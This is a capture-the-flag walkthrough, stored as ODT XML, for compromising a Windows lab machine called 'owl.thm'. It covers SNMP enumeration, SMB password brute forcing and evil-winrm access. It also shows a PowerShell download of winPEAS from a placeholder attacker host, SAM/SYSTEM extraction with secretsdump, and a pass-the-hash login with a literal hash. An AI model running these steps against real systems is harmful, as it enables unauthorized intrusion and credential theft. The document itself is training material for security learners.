      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">onesixtyone owl.thm -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt</text:span></text:p>
      <text:p text:style-name="P6">The community string for this machine is <text:span text:style-name="Strong_20_Emphasis">openview</text:span>. With this information we can use <text:span text:style-name="Source_20_Text">snmp-check</text:span> to dump all available information from the machine.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">snmp-check -c openview $ip</text:span></text:p>
      <text:p text:style-name="P6">We can see the only unique username is <text:span text:style-name="Strong_20_Emphasis">Jareth. </text:span>We can additionally see all valid listening TCP/UDP ports incase this information is not enough</text:p>
      <text:p text:style-name="P6">Results</text:p>
      <text:p text:style-name="P6"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">Port</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis">Result</text:span></text:p>
      <text:p text:style-name="P6">80/443 (HTTP(S))</text:p>
      <text:p text:style-name="P6">nothing of value found, no directories or low hanging fruit</text:p>
      <text:p text:style-name="P6">139/445 (SMB)</text:p>
      <text:p text:style-name="P6">no anonymous viewing, need creds</text:p>
      <text:p text:style-name="P6">161 SNMP</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis">found a valid username</text:span></text:p>
      <text:p text:style-name="P6">Local Privilege Escalation</text:p>
      <text:p text:style-name="P6">As we know that we need creds for smb, we can brute force the username with the rockyou password file using <text:span text:style-name="Source_20_Text">crackmapexec</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">crackmapexec smb owl.thm -u Jareth -p /root/payloads/rockyou.txt</text:span></text:p>
      <text:p text:style-name="P6">The valid credentials are <text:span text:style-name="Strong_20_Emphasis">Jareth:sarah</text:span>. We can now list SMB shares which are empty. </text:p>
      <text:p text:style-name="P6">We can try using <text:span text:style-name="Source_20_Text">evil-winrm</text:span> as we know those ports are open. </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">ruby evil-winrm.rb -u Jareth -p sarah -i owl.thm</text:span></text:p>
      <text:p text:style-name="P6">and we have an initial foothold</text:p>
      <text:p text:style-name="P6">Administrator Privilege Escalation</text:p>
      <text:p text:style-name="P6">We do not have a <text:span text:style-name="Source_20_Text">whoami /priv</text:span> technique to exploit so I downloaded winPEAS after finding nothing in the standard user files. The antivirus software has disabled many common commands and running .exe files so I used powershell to download the winPEAS.bat file using</text:p>
      <text:p text:style-name="P6">(New-Object System.Net.WebClient).DownloadFile("http://attackIP/winPEAS.bat", "C:\users\jareth\documents\winPEAS.bat")</text:p>
      <text:p text:style-name="P6">.\winPEAS.bat</text:p>
      <text:p text:style-name="P6">winPEAS suggested some potential locations with creds, bypass techniques that required admin privileges and other empty ended attempts at privilege escalation. Looking around some common checklists, I came across a to check for deleted files via the </text:p>
      <text:p text:style-name="P6">with the user SID which we know from winPEAS</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'</text:span></text:p>
      <text:p text:style-name="P6">The recycle bin contained a backup of the system and the Security Account Manager database, system.bak and sam.bak files to extract the administrator credentials. </text:p>
      <text:p text:style-name="P6">We need to make a c:\temp directory, transfer the files there and download them via evil-winrm.</text:p>
      <text:p text:style-name="P6">Next we can crack the files with secretsdump.py to obtain the NTLM hash of the administrator. </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">python3 secretsdump.py -sam sam.bak -system system.bak LOCAL &gt;&gt; hashes.txt</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">ruby evil-winrm.rb -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i owl.thm</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08:32:18.698068414</meta:creation-date>
    <dc:date>2022-01-03T18:23:37.871985802</dc:date>
    <meta:editing-duration>PT1H17M24S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>LibreOffice/7.2.4.1$Linux_X86_64 LibreOffice_project/20$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="8" meta:paragraph-count="300" meta:word-count="1885" meta:character-count="16259" meta:non-whitespace-character-count="13856"/>
  </office:meta>
</office:document-meta>
</file>